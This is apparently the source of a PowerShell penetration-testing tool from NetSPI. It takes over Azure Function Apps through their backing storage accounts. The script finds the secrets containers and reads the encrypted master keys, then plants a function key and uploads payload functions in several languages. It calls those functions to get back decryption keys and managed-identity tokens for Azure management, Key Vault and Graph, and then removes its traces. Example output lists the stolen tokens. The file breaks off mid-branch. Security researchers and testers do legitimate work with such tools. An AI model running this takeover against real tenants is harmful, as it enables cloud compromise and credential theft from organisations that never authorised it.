<#
    File: Invoke-AzFunctionAppTakeover.ps1
    Authors: Thomas Elling (@thomas_elling), NetSPI - 2023
             Karl Fosaaen (@kfosaaen), NetSPI - 2023
    Description: PowerShell function for exploiting issues in Azure Function Apps.
#>



function Invoke-AzFunctionAppTakeover{

<#
    .SYNOPSIS
        PowerShell function for dumping information from Azure Function Apps via Storage Account manipulation and authenticated Az PowerShell connections.
	.DESCRIPTION
        The function will scan available Azure Storage Accounts for those that are supporting Azure Function Apps. Storage Accounts and the corresponding Function Apps can then be selected and files will be uploaded to add new functions that will dump available information (Master Keys and Managed Identity Tokens) from an Azure Function App.
	.PARAMETER Az
        Use Az PowerShell authentication mode (Connect-AzAccount, etc.). Mutually exclusive with -Sas.
    .PARAMETER Sas
        Use SAS token authentication mode. Requires both -StorageAccountName and -SasToken. Mutually exclusive with -Az.
    .PARAMETER Subscription
        The Subscription name to use.
        Optional – used only when -Az authentication mode is selected.
    .PARAMETER StorageAccountName
        The name of the target storage account.
        Mandatory when using -Sas mode.
    .PARAMETER SasToken
        The SAS token to authenticate access to the storage account.
        Mandatory when using -Sas mode.
    .EXAMPLE
        PS C:\> Invoke-AzFunctionAppTakeover -Az -Verbose
		VERBOSE: Currently logged in via Az PowerShell as kfosaaen@notatenant.com
        VERBOSE: Use Connect-AzAccount to change your user
        VERBOSE: Dumping Function App information for Selected Subscriptions...
        VERBOSE: 	Enumerating Function App attached Storage Accounts in the TestEnvironment subscription
        VERBOSE: 		Function App Storage Account Found - POCstorageAccount1 - mystarterapp Function App
        VERBOSE: 		Function App Storage Account Found - POCstorageAccount2 - importantbankingapp Function App
        VERBOSE: 		Function App Storage Account Found - POCstorageAccount2 - lessimportantbankingapp Function App
        VERBOSE: 		Function App Storage Account Found - POCstorageAccount3 - managedidentityfunction Function App
        [Truncated]
        VERBOSE: 	15 Function App Storage Accounts Enumerated in the Subscription
        VERBOSE: 	Dumping Function App information for selected Storage Accounts
        VERBOSE: 		Determining Function App Language of the managedidentityfunction function in the POCstorageAccount3 Storage Account
        VERBOSE: 			Reviewing the managedidentityfunctiona16a File Share
        VERBOSE: 				ASP.NET folder found in the managedidentityfunctiona16a File Share
        VERBOSE: 				ASP.NET file found in the site/wwwroot/HttpTrigger1 folder in the managedidentityfunctiona16a File Share
        VERBOSE: 				ASP.NET file found in the site/wwwroot/HttpTrigger2 folder in the managedidentityfunctiona16a File Share
        VERBOSE: 				Attempting to add a new ASP.NET function to the managedidentityfunctiona16a File Share in the POCstorageAccount3 Storage Account
        VERBOSE: 					Creating the MFRgBWvsDIlkyfT folder in the managedidentityfunctiona16a File Share in the POCstorageAccount3 Storage Account and uploading files
        VERBOSE: 					Sleeping for 60 seconds before calling the new function
        VERBOSE: 					Calling the new function (until it stops 404-ing) to return the tokens and decryption key, this may take a while...
        VERBOSE: 						Avoid hitting ctrl+C to break out of this, you will need to manually remove the added Storage Account files in order to clean up
        VERBOSE: 					Removing the files from the Storage Account
        VERBOSE: 		Completed attacking the managedidentityfunction Function App in the managedidentityfunctiona16a File Share

        FunctionApp        : managedidentityfunction
        EncryptedMasterKey : bm9[Truncated]=
        EncryptionKey      : 1B1[Truncated]9
        ManagementToken    : eyJ[Truncated]g
        VaultToken         : eyJ[Truncated]g
        GraphToken         : eyJ[Truncated]Q

        VERBOSE: All Function App / Storage Account attacks have completed

#>


    [CmdletBinding(DefaultParameterSetName = "Az")]
    param (
        [Parameter(Mandatory = $true,
                ParameterSetName = "Az",
                HelpMessage = "Authentication mode: Az")]
        [switch]$Az,

        [Parameter(Mandatory = $true,
                ParameterSetName = "Sas",
                HelpMessage = "Authentication mode: Sas")]
        [switch]$Sas,

        [Parameter(Mandatory = $false,
                HelpMessage = "Subscription name to target.",
                ParameterSetName = "Az")]
        [string]$Subscription = "",

        [Parameter(Mandatory = $true,
                ParameterSetName = "Sas",
                HelpMessage = "Storage account name to target.")]
        [string]$StorageAccountName,

        [Parameter(Mandatory = $true,
                ParameterSetName = "Sas",
                HelpMessage = "SasToken for the storage account.")]
        [string]$SasToken
    )

    <#
        Optional Future Additions 
            - web shell upload
            - Support for Storage Account Access Keys
            - Dump all the function app info (API endpoints), all keys, env variables
            - Extraction of key vault references in configuration app settings
            - Add logic for multi-language functions (ps1 files in an ASP function)

        !!! Corner-Case - Linux Function app created, but no functions - App won't have a share
                - In this case, we just skip it, as there is no share to work with
        
        !!! Corner-Case - Multiple Managed Identities - User-assigned and System-assigned

    #>

    if ($Az) {
        if (-not $Subscription) {
            Write-Verbose "Currently logged in via Az PowerShell as $((Get-AzContext).Account.Id)"; Write-Verbose 'Use Connect-AzAccount to change your user'

            # List subscriptions, pipe out to gridview selection
            $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
            $subChoice = $Subscriptions | Out-GridView -Title "Select One or More Subscriptions" -PassThru

            if($subChoice.count -eq 0){Write-Verbose 'No subscriptions selected, exiting'; break}

            Write-Verbose "Dumping Function App information for Selected Subscriptions..."

            # Recursively iterate through the selected subscriptions and pass along the parameters
            Foreach ($sub in $subChoice){Select-AzSubscription -Subscription $sub.Name | Out-Null; Invoke-AzFunctionAppTakeover -Az -Subscription $sub.Name}
            break

        }

        Write-Verbose "`tEnumerating Function App attached Storage Accounts in the $Subscription subscription"

        # Try to enumerate the Storage Accounts
        $storageAccounts = Get-AzStorageAccount
        # If one or more Storage Accounts, Continue
        if($storageAccounts.Count -eq 0){Write-Verbose "No available Storage Accounts in the $Subscription subscription"}
    } elseif ($Sas) {
        if (-not $SasToken) {
            throw "In -Sas mode, -SasToken must be specified."
        }
        if (-not $StorageAccountName) {
            throw "In -Sas mode, -StorageAccountName specified."
        }

        Write-Verbose "`tUsing SAS Token to authenticate against Storage Account: $StorageAccountName"
        $storageAccounts = @(
            [PSCustomObject]@{
                StorageAccountName = $StorageAccountName
                ResourceGroupName  = ""
            }
        )
    } else {
        throw "Neither -Az nor -Sas mode selected. One must be chosen."
    }

    # Create data table to house accounts
    $TempTblaccts = New-Object System.Data.DataTable 
    $TempTblaccts.Columns.Add("StorageAccount") | Out-Null
    $TempTblaccts.Columns.Add("FunctionApp") | Out-Null

    # Create data table to house keys and tokens
    $TempTblkeys = New-Object System.Data.DataTable 
    $TempTblkeys.Columns.Add("FunctionApp") | Out-Null
    $TempTblkeys.Columns.Add("EncryptedMasterKey") | Out-Null
    $TempTblkeys.Columns.Add("EncryptionKey") | Out-Null
    $TempTblkeys.Columns.Add("ManagementToken") | Out-Null
    $TempTblkeys.Columns.Add("VaultToken") | Out-Null
    $TempTblkeys.Columns.Add("GraphToken") | Out-Null

    foreach ($acct in $storageAccounts) {
        try {
            # Set Context for current Storage Account
            $currentContext = if ($Sas) {
                New-AzStorageContext -StorageAccountName $StorageAccountName -SasToken $SasToken -ErrorAction Stop
            } else {
                (Get-AzStorageAccount -ResourceGroupName $acct.ResourceGroupName -Name $acct.StorageAccountName -ErrorAction Stop).Context
            }
            # List the Containers for the Storage Account that match "azure-webjobs-secrets"
            $containerList = Get-AzStorageContainer -Context $currentContext -ErrorAction Stop | Where-Object Name -eq "azure-webjobs-secrets"
        }
        catch {$containerList = $null}

        if ($containerList) {
            # Review Container names for "azure-webjobs-hosts", add to data table
            foreach ($container in $containerList) {
                # At the secrets container level, get all the blobs, call out the ones with host.json
                Get-AzStorageBlob -Context $currentContext -Container $container.Name | 
                    Where-Object Name -Match "host.json" | ForEach-Object {
                        $funcAppName = ($_.Name).Split("/")[0]
                        $TempTblaccts.Rows.Add($currentContext.StorageAccountName, $funcAppName) | Out-Null
                        Write-Verbose "`t`tFunction App Storage Account Found - $($currentContext.StorageAccountName) - $funcAppName Function App"
                    }
            }
        }
    }

    Write-Verbose "`t$($TempTblaccts.Rows.Count) Function App Storage Accounts Enumerated"

    # Out-gridview list of Function App SAs to select from
    $selectedStorageAccounts = $TempTblaccts | Sort-Object -Property "FunctionApp" | Out-GridView -Title "Select One or More Storage Accounts / Function Apps to attack" -PassThru

    if($selectedStorageAccounts.count -eq 0){Write-Verbose 'No Storage Accounts selected'}
    else{
        Write-Verbose "`tDumping Function App information for selected Storage Accounts"

        # Take list of selected SAs and go through the takeover process
        $selectedStorageAccounts | ForEach-Object{
        
            # DNS Check if Function App still exists            
            try{
                Resolve-DnsName (-join($_.FunctionApp,".azurewebsites.net")) -ErrorAction Stop -Verbose:$false -DnsOnly |Out-Null
                $appStatus = $true
            }
            catch{
                $appStatus = $false
                Write-Verbose "`t`tThe $($_.FunctionApp) Function App found in the $($_.StorageAccount) Storage Account does not exist"
            }

            # Check for auth requirement
            if((Invoke-WebRequest -Verbose:$false -UseBasicParsing -Uri (-join("https://",$_.FunctionApp,".azurewebsites.net"))).BaseResponse.ResponseUri.Host -ne (-join($_.FunctionApp,".azurewebsites.net"))){
                $appStatus = $false
                Write-Verbose "`t`tThe $($_.FunctionApp) Function App found in the $($_.StorageAccount) Storage Account requires authentication. Please try this attack manually."
            }
            
            if($appStatus -eq $true){
                Write-Verbose "`t`tDetermining Function App Language of the $($_.FunctionApp) function in the $($_.StorageAccount) Storage Account"
                $currentStorage = ($storageAccounts | where StorageAccountName -EQ $_.StorageAccount)
                $currentApp = $_.FunctionApp

                # Set Storage Context
                $storageContext = if($Sas) {
                    $currentContext
                } else {
                    (Get-AzStorageAccount -ResourceGroupName $currentStorage.ResourceGroupName -Name $currentStorage.StorageAccountName).Context
                }
            
                # Hack-ish filter to get the desired Function App - Share name conventions should be FunctionAppNameAB12, where AB12 is 4 random numbers/letters
                $fileShareList = Get-AZStorageShare -Context $storageContext | where Name -Match $_.FunctionApp

                $sharesIter = 0
                if($fileShareList.Count -gt 1){
                    $fileShareList | ForEach-Object{
                        # Strip off the last 4 of the share name for app matching
                        if(($_.Name -replace ".{4}$") -eq $currentApp){$fileShareList = $fileShareList[$sharesIter]}
                        $sharesIter += 1
                    }
                }

                <#
                    $appType = "ASP.NET"
                    $appType = "PowerShell"
                    $appType = "Node.js"
                    $appType = "Java"
                    $appType = "Python"
                    $appType = "CustomHandler"
                #>

                # Start with UNDETERMINED as the base option
                $appType = "UNDETERMINED"            

                # Walk each share and look at files to determine app type
                $fileShareList | ForEach-Object {
                    # Get root level files
                    $currentShare = $_.Name
                    $fileShareFilesList = Get-AzStorageFile -ShareName $_.Name -Context $storageContext
                    Write-Verbose "`t`t`tReviewing the $($_.Name) File Share"

                    # If there's an ASP.NET directory, it probably supports ASP.NET code
                    $fileShareFilesList | ForEach-Object{
                        if(($_.ListFileProperties).FileAttributes -eq "Directory"){
                            if($_.Name -eq "ASP.NET"){$appType = "ASP.NET"; Write-Verbose "`t`t`t`tASP.NET folder found in the $currentShare File Share"}
                        }
                    }

                    # Get files from wwwroot for review
                    $wwwFiles = (Get-AzStorageFile -ShareName $currentShare  -Context $storageContext -Path site/wwwroot/ | Get-AzStorageFile)

                    # Check DIR listing for folders
                    $wwwFiles | ForEach-Object{
                        if(($_.ListFileProperties).FileAttributes -eq "Directory"){
                            # Get files within each folder
                            $functionFolderFiles = (Get-AzStorageFile -ShareName $currentShare  -Context $storageContext -Path site/wwwroot/$($_.Name) | Get-AzStorageFile)

                            $currentFolder = $_.Name

                            # Check each file for extension
                            $functionFolderFiles | ForEach-Object{
                                if(($_.ListFileProperties).IsDirectory -eq $false){
                                
                                    # If js file, then $appType = "Node.js"
                                    if(($_.Name).Split(".")[-1] -ieq "js"){$appType = "Node.js"; Write-Verbose "`t`t`t`tNode.js file found in the site/wwwroot/$currentFolder folder in the $currentShare File Share"}
                                    
                                    # If workflow.json file, then $appType = "Node.js", as it's a Logic App
                                    if($_.Name -ieq "workflow.json"){$appType = "Node.js"; Write-Verbose "`t`t`t`tworkflow.json file found in the site/wwwroot/$currentFolder folder in the $currentShare File Share"}
                                
                                    # If py file, then $appType = "Python"
                                    if(($_.Name).Split(".")[-1] -ieq "py"){$appType = "Python"; Write-Verbose "`t`t`t`tPython file found in the site/wwwroot/$currentFolder folder in the $currentShare File Share"}

                                    # If csx file, then $appType = "ASP.NET"
                                    if(($_.Name).Split(".")[-1] -ieq "csx"){$appType = "ASP.NET"; Write-Verbose "`t`t`t`tASP.NET file found in the site/wwwroot/$currentFolder folder in the $currentShare File Share"}

                                    # If ps1 file, then $appType = "PowerShell"
                                    if(($_.Name).Split(".")[-1] -ieq "ps1"){$appType = "PowerShell"; Write-Verbose "`t`t`t`tPowerShell file found in the site/wwwroot/$currentFolder folder in the $currentShare File Share"}

                                    # If java files, then $appType = "Java"
                                    if(($_.Name).Split(".")[-1] -ieq "java"){$appType = "Java"; Write-Verbose "`t`t`t`tJava file found in the site/wwwroot/$currentFolder folder in the $currentShare File Share"}

                                }
                            }
                        }
                    }
                }
                
                # Once a language is determined, add a function to the file share
                if($appType -ne "UNDETERMINED"){Write-Verbose "`t`t`t`tAttempting to add a new $appType function to the $($fileShareList.Name) File Share in the $($storageContext.Name) Storage Account"}

                # Get the host.json file from the blobs
                $containerList = Get-AzStorageContainer -Context $storageContext

                switch($appType){
                    "ASP.NET" {

                        # Get the function app keys to decrypt
                        $secretsFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match "host.json" | where Name -Match $_.FunctionApp
                        $secretsIter = 0
                        if($secretsfile.count -gt 1){
                            $secretsfile | ForEach-Object{
                                if($_.Name.split("/")[0] -eq $currentApp){$secretsfile = $secretsfile[$secretsIter]}
                                $secretsIter += 1
                            }
                        }
                        $TempFile = New-TemporaryFile
                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $secretsFile.Name -Context $storageContext -Destination $TempFile -Verbose:$false -Force | Out-Null
                        $encryptedFunctionKeys = (gc $TempFile | ConvertFrom-Json)


                        # Find a function JSON file (not host.json) to use as a template
                        $TempJSONFileDown = New-TemporaryFile
                        $functionTemplateFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match ".json" | where Name -Match $_.FunctionApp | where Name -NotMatch "host.json"
                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $functionTemplateFile[0].Name -Context $storageContext -Destination $TempJSONFileDown -Verbose:$false -Force | Out-Null

                        # Generate new json secrets file for the function
                        $newkey = @{
                            name = "tempfunckey"
                            value = (New-Guid).Guid
                            encrypted = $false
                        }
                        $functionCode = $newkey.value
                        
                        # Create a new object from the template file
                        $functionTemplate = (gc $TempJSONFileDown | ConvertFrom-Json)

                        # Add the key to the object
                        $functionTemplate.keys += $newkey
                        $TempJSONFile = New-TemporaryFile
                        $functionTemplate | ConvertTo-Json | Out-File $TempJSONFile

                        # Create new File Share (site/wwwroot/$newFolder) folder
                        $newFolder = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                        # Upload the keys file
                        Set-AzStorageBlobContent -Container "azure-webjobs-secrets" -File $TempJSONFile -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Context $storageContext -Verbose:$false | Out-Null


                        # Determine container OS
                        $hostENVvar = ($encryptedFunctionKeys.decryptionKeyId).Split("=")[0]
                        if($hostENVvar -eq "MACHINEKEY_DecryptionKey"){$containerOS = "windows"}
                        else{$containerOS = "linux"}

                        Write-Verbose "`t`t`t`t`tCreating the $($newFolder) folder in the $($fileShareList.Name) File Share in the $($storageContext.Name) Storage Account and uploading files"

                        New-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder | Out-Null

                        if($containerOS -eq "windows"){
                            # Upload Windows ASP.NET function files to the Storage Account
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\ASPNET\Windows\function.json -Path site/wwwroot/$newFolder/function.json -Force -Verbose:$false | Out-Null
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\ASPNET\Windows\run.csx -Path site/wwwroot/$newFolder/run.csx -Force -Verbose:$false | Out-Null
                        }
                        else{
                            # Upload Linux ASP.NET function files to the Storage Account
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\ASPNET\Linux\function.json -Path site/wwwroot/$newFolder/function.json -Force -Verbose:$false | Out-Null
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\ASPNET\Linux\run.csx -Path site/wwwroot/$newFolder/run.csx -Force -Verbose:$false | Out-Null
                        }

                        Write-Verbose "`t`t`t`t`tSleeping for 60 seconds before calling the new function"
                        sleep 60
                    
                        Write-Verbose "`t`t`t`t`tCalling the new function (until it stops 404-ing) to return the tokens and decryption key, this may take a while..."
                        Write-Verbose "`t`t`t`t`t`tAvoid hitting ctrl+C to break out of this, you will need to manually remove the added Storage Account files in order to clean up"

                        $httpResponseContent = $null

                        # Make request to the new function and return the results
                        while ($httpResponseContent -eq $null){
                            try{
                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
                                if ($httpFullResponse.StatusCode -eq 200){
                                    $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                }
                                else{$httpResponseContent = "Something Failed"}
                            }
                            catch{}
                        }

                        # Handle missing MI Tokens and add to table
                        if($httpResponseContent.management_token){$managementToken = $httpResponseContent.management_token}else{$managementToken = "N/A"}
                        if($httpResponseContent.vault_token){$vaultToken = $httpResponseContent.vault_token}else{$vaultToken = "N/A"}
                        if($httpResponseContent.graph_token){$graphToken = $httpResponseContent.graph_token}else{$graphToken = "N/A"}
                        $TempTblkeys.Rows.Add($currentApp,$encryptedFunctionKeys.masterKey.value, $httpResponseContent.decryption_key, $managementToken, $vaultToken, $graphToken) | Out-Null
                        

                        Write-Verbose "`t`t`t`t`tRemoving the files from the Storage Account"
                        # Remove temp files
                        Remove-Item $TempFile -Force | Out-Null
                        Remove-Item $TempJSONFile -Force | Out-Null
                        Remove-Item $TempJSONFileDown -Force | Out-Null                        

                        # Delete each of the added files and remove the folder from the Storage Account Share
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/function.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/project.assets.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/NuGet/Migrations/1 -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/run.csx -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/NuGet/Migrations -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/NuGet -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder -ErrorAction Stop}catch{}

                        # Delete generated funtion file from the Storage Account Container (azure-webjobs-secrets/$currentApp/$newFolder.json)
                        try{
                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Verbose:$false | Out-Null
                            $snapshotDelete = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match $newFolder.ToLower()
                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob $snapshotDelete.Name -Verbose:$false | Out-Null
                            }
                        catch{}
                    }
                    "PowerShell" {

                        # Get the function app keys to decrypt
                        $secretsFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match "host.json" | where Name -Match $_.FunctionApp
                        $secretsIter = 0
                        if($secretsfile.count -gt 1){
                            $secretsfile | ForEach-Object{
                                if($_.Name.split("/")[0] -eq $currentApp){$secretsfile = $secretsfile[$secretsIter]}
                                $secretsIter += 1
                            }
                        }
                        $TempFile = New-TemporaryFile
                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $secretsFile.Name -Context $storageContext -Destination $TempFile -Verbose:$false -Force | Out-Null
                        $encryptedFunctionKeys = (gc $TempFile | ConvertFrom-Json)

                        # Find a function JSON file (not host.json) to use as a template
                        $TempJSONFileDown = New-TemporaryFile
                        $functionTemplateFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match ".json" | where Name -Match $_.FunctionApp | where Name -NotMatch "host.json"
                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $functionTemplateFile[0].Name -Context $storageContext -Destination $TempJSONFileDown -Verbose:$false -Force | Out-Null

                        # Generate new json secrets file for the function
                        $newkey = @{
                            name = "tempfunckey"
                            value = (New-Guid).Guid
                            encrypted = $false
                        }
                        $functionCode = $newkey.value
                        
                        # Create a new object from the template file
                        $functionTemplate = (gc $TempJSONFileDown | ConvertFrom-Json)

                        # Add the key to the object
                        $functionTemplate.keys += $newkey
                        $TempJSONFile = New-TemporaryFile
                        $functionTemplate | ConvertTo-Json | Out-File $TempJSONFile

                        # Determine container OS
                        $hostENVvar = ($encryptedFunctionKeys.decryptionKeyId).Split("=")[0]
                        if($hostENVvar -eq "MACHINEKEY_DecryptionKey"){$containerOS = "windows"}
                        else{$containerOS = "linux"}
                                        
                        # Create new File Share (site/wwwroot/$newFolder) folder
                        $newFolder = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                        # Upload the keys file
                        Set-AzStorageBlobContent -Container "azure-webjobs-secrets" -File $TempJSONFile -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Context $storageContext -Verbose:$false | Out-Null


                        Write-Verbose "`t`t`t`t`tCreating the $($newFolder) folder in the $($fileShareList.Name) File Share in the $($storageContext.Name) Storage Account and uploading files"

                        New-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder | Out-Null

                        if($containerOS -eq "windows"){
                            # Upload Windows PowerShell function files to the Storage Account
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\PSCore\Windows\function.json -Path site/wwwroot/$newFolder/function.json -Force -Verbose:$false | Out-Null
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\PSCore\Windows\run.ps1 -Path site/wwwroot/$newFolder/run.ps1 -Force -Verbose:$false | Out-Null
                        }
                        else{
                            # Upload Linux PowerShell function files to the Storage Account
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\PSCore\Linux\function.json -Path site/wwwroot/$newFolder/function.json -Force -Verbose:$false | Out-Null
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\PSCore\Linux\run.ps1 -Path site/wwwroot/$newFolder/run.ps1 -Force -Verbose:$false | Out-Null
                        }

                        Write-Verbose "`t`t`t`t`tSleeping for 60 seconds before calling the new function"
                        sleep 60
                    
                        Write-Verbose "`t`t`t`t`tCalling the new function (until it stops 404-ing) to return the tokens and decryption key, this may take a while..."
                        Write-Verbose "`t`t`t`t`t`tAvoid hitting ctrl+C to break out of this, you will need to manually remove the added Storage Account files in order to clean up"

                        $httpResponseContent = $null

                        # Make request to the new function and return the results
                        while ($httpResponseContent -eq $null){
                            try{
                                $httpFullResponse = (Invoke-WebRequest -Uri "https://$currentApp.azurewebsites.net/api/$($newFolder)?name=$currentApp&code=$functionCode" -UseBasicParsing -Verbose:$false)
                                if ($httpFullResponse.StatusCode -eq 200){
                                    $httpResponseContent = $httpFullResponse.Content | ConvertFrom-Json
                                }
                                else{$httpResponseContent = "Something Failed"}
                            }
                            catch{}
                        }

                        # Handle missing MI Tokens and add to table
                        if($httpResponseContent.managementToken){$managementToken = $httpResponseContent.managementToken}else{$managementToken = "N/A"}
                        if($httpResponseContent.vaultToken){$vaultToken = $httpResponseContent.vaultToken}else{$vaultToken = "N/A"}
                        if($httpResponseContent.graphToken){$graphToken = $httpResponseContent.graphToken}else{$graphToken = "N/A"}
                        $TempTblkeys.Rows.Add($currentApp,$encryptedFunctionKeys.masterKey.value, $httpResponseContent.decryptionKeyId, $managementToken, $vaultToken, $graphToken) | Out-Null
                        

                        Write-Verbose "`t`t`t`t`tRemoving the files from the Storage Account"
                        # Remove temp files
                        Remove-Item $TempFile -Force | Out-Null

                        # Delete each of the added files and remove the folder from the Storage Account Share
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/function.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/run.ps1 -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/project.assets.json -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageFile -Context $storageContext -ShareName $fileShareList.Name -Path site/wwwroot/$newFolder/NuGet/Migrations/1 -Verbose:$false -ErrorAction Stop | Out-Null}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/NuGet/Migrations -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder/NuGet -ErrorAction Stop}catch{}
                        try{Remove-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder -ErrorAction Stop}catch{}

                        # Delete generated funtion file from the Storage Account Container (azure-webjobs-secrets/$currentApp/$newFolder.json)
                        try{
                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Verbose:$false | Out-Null
                            $snapshotDelete = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match $newFolder.ToLower()
                            Remove-AzStorageBlob -Context $storageContext -Container "azure-webjobs-secrets" -Blob $snapshotDelete.Name -Verbose:$false | Out-Null
                            }
                        catch{}
                    }
                    "Node.js" {

                        # Get the function app keys to decrypt
                        $secretsFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match "host.json" | where Name -Match $_.FunctionApp
                        $secretsIter = 0
                        if($secretsfile.count -gt 1){
                            $secretsfile | ForEach-Object{
                                if($_.Name.split("/")[0] -eq $currentApp){$secretsfile = $secretsfile[$secretsIter]}
                                $secretsIter += 1
                            }
                        }
                        $TempFile = New-TemporaryFile
                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $secretsFile.Name -Context $storageContext -Destination $TempFile -Verbose:$false -Force | Out-Null
                        $encryptedFunctionKeys = (gc $TempFile | ConvertFrom-Json)

                        # Find a function JSON file (not host.json) to use as a template
                        $TempJSONFileDown = New-TemporaryFile
                        $functionTemplateFile = Get-AzStorageBlob -Context $storageContext -Name "azure-webjobs-secrets" | select Name | where Name -Match ".json" | where Name -Match $_.FunctionApp | where Name -NotMatch "host.json"
                        Get-AzStorageBlobContent -Container "azure-webjobs-secrets" -Blob $functionTemplateFile[0].Name -Context $storageContext -Destination $TempJSONFileDown -Verbose:$false -Force | Out-Null

                        # Generate new json secrets file for the function
                        $newkey = @{
                            name = "tempfunckey"
                            value = (New-Guid).Guid
                            encrypted = $false
                        }
                        $functionCode = $newkey.value
                        
                        # Create a new object from the template file
                        $functionTemplate = (gc $TempJSONFileDown | ConvertFrom-Json)

                        # Add the key to the object
                        $functionTemplate.keys += $newkey
                        $TempJSONFile = New-TemporaryFile
                        $functionTemplate | ConvertTo-Json | Out-File $TempJSONFile

                        # Determine container OS
                        $hostENVvar = ($encryptedFunctionKeys.decryptionKeyId).Split("=")[0]
                        if($hostENVvar -eq "MACHINEKEY_DecryptionKey"){$containerOS = "windows"}
                        else{$containerOS = "linux"}

                        # Create new File Share (site/wwwroot/$newFolder) folder
                        $newFolder = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                        # Upload the keys file
                        Set-AzStorageBlobContent -Container "azure-webjobs-secrets" -File $TempJSONFile -Blob (-join($currentApp,"/",$newFolder,".json").ToLower()) -Context $storageContext -Verbose:$false | Out-Null

                        Write-Verbose "`t`t`t`t`tCreating the $($newFolder) folder in the $($fileShareList.Name) File Share in the $($storageContext.Name) Storage Account and uploading files"

                        New-AzStorageDirectory -ShareName $fileShareList.Name -Context $storageContext -Path site/wwwroot/$newFolder | Out-Null

                        if($containerOS -eq "windows"){
                            # Upload Windows PowerShell function files to the Storage Account
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\Node\Windows\function.json -Path site/wwwroot/$newFolder/function.json -Force -Verbose:$false | Out-Null
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\Node\Windows\index.js -Path site/wwwroot/$newFolder/index.js -Force -Verbose:$false | Out-Null
                        }
                        else{
                            # Upload Linux PowerShell function files to the Storage Account
                            Set-AzStorageFileContent -Context $storageContext -ShareName $fileShareList.Name -Source $PSScriptRoot\Payloads\Node\Linux\function.json -Path site/wwwroot/$newFolder/function.json -Force -Verbose:$false | Out-Null
